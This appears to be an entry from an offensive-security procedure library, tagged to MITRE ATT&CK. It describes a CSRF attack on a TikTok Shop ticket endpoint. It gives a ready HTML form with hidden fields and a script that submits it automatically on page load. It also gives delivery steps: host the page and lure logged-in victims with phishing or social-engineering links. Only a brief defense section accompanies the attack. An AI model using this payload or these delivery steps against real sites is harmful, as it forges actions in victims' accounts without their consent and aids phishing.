---
tags:
  - csrf
  - payload
  - html
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:36.407Z'
sub_techniques: []
id: 054f7a89-5ca8-4860-8d27-2faed79b2208
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-HTML-Form-for-CSRF-Attack

## Summary

This procedure crafts an HTML form that auto-submits a forged POST request to the TikTok Shop ticket endpoint, exploiting the CSRF bypass to create unauthorized tickets when visited by an authenticated user.

## Description

In the attack scenario, the HTML simulates the bypassed request format using hidden fields and JavaScript for automatic submission. Target is any authenticated TikTok Shop user tricked into loading the page (e.g., via phishing link). Prerequisites: Confirmed bypass from prior steps. Expected outcomes: Silent ticket creation in the victim's account, demonstrating full exploitation.

## Requirements

1. Text editor to create HTML file
2. Web server to host the malicious page
3. Knowledge of bypassed request parameters

## Defense

Defensive measures and detection strategies:

- Deploy Content Security Policy (CSP) to block inline scripts and form submissions
- Educate users on phishing and suspicious links
- Log cross-origin requests to the endpoint

## Objectives

1. Encode attack payload in HTML form
2. Auto-submit to forge request without user interaction
3. Achieve unauthorized ticket creation

## Instructions

### Step 1: Build the HTML Form

**Context**: Create hidden inputs matching the form-encoded payload.

Write HTML: <form method="POST" action="https://vulnerableEndpoint"> <input type="hidden" name="category_id" value="1"> <input type="hidden" name="title" value="Unauthorized Ticket"> <input type="hidden" name="componentContents" value="%7B%5C%22type%5C%22%3A%5C%22file%5C%22%2C%5C%22data%5C%22%3A%5C%22simulated%5C%22%7D"> </form>. Add <script>document.forms[0].submit();</script> for auto-submit.

**Expected Output**: Valid HTML file ready for hosting.

### Step 2: Host and Deliver

**Context**: Serve the page and lure the victim.

Host on a server (e.g., GitHub Pages or local HTTP). Send link via email/social engineering, ensuring victim is logged into TikTok.

**Expected Output**: Form submits on load, creating ticket.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[payload]]
